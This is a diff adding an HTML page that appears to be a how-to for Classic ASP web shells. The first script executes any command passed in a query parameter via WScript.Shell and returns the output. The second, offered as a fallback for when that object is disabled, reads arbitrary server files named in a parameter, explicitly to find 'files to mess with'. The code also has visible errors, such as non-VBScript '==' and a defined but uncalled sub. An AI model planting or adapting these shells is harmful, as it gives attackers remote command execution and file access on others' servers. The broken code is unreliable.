@@ -1,0 +1,42 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Classic with VB</title>
+</head><body>&lt;%<br/>
+Set command = Request.QueryString("lol")<br/>
+if command == "" then<br/>
+Response.Write("No Command Entered!");<br/>
+else<br/>
+Set objWShell = CreateObject("WScript.Shell")<br/>
+Set objCmd = objWShell.Exec(command)<br/>
+strPResult = objCmd.StdOut.Readall()<br/>
+set objCmd = nothing: Set objWShell = nothing<br/>
+Response.Write(strPResult)<br/>
+end if<br/>
+%&gt; <br/>
+<br/>
+Now for a brief run down of the code. Set command = Request.QueryString("lol") assigns the GET'd variable 'lol' to 'command'. Set objWShell = CreateObject("WScript.Shell") creates our shell object. Set objCmd = objWShell.Exec(command) executes the command stored in our query string. strPResult = objCmd.StdOut.Readall() stores the output from the command shell in a string (strPResult). set objCmd = nothing: Set objWShell = nothing just does some variable and object clean up. Response.Write(strPResult) simply spits out the command we executed. Sometimes however, you may run into an IIS configuration that disables the Wscript.Shell object and you may need to go around it. If this is the case. you'll have to just get by with the FilesSystemObject. <br/>
+<br/>
+&lt;%<br/>
+Response.Write("Full directory path is: &lt;br /&gt;&lt;strong&gt;")<br/>
+Response.Write(Server.MapPath(".")) <br/>
+Response.Write("&lt;/strong&gt;&lt;br /&gt;")<br/>
+ourfile = Request.QueryString("file")<br/>
+if ourfile == "" then<br/>
+Response.Write("No file specified!")<br/>
+else<br/>
+SUB ReadDisplayFile(FileToRead)<br/>
+ourfile=server.mappath(FileToRead)<br/>
+Set fs = CreateObject("Scripting.FileSystemObject")<br/>
+Set thisfile = fs.OpenTextFile(ourfile, 1, False)<br/>
+tempSTR=thisfile.readall<br/>
+response.write(tempSTR)<br/>
+thisfile.Close<br/>
+set thisfile=nothing<br/>
+set fs=nothing<br/>
+end sub<br/>
+end if<br/>
+%&gt; <br/>
+<br/>
+In the first line, I show the full path to the currently executing script to make it easier to locate files to mess with. Next the code grabs the file name and stores it in the variable 'ourfile'. From there I call my stupid sub procedure which attempts to grab the real path of the file passed to it. The code then creates our FileSystemObject so we can open / read the file. We then read the file and output it into another variable. Finally the file is read back to us and we clean up our variables. </body></html>
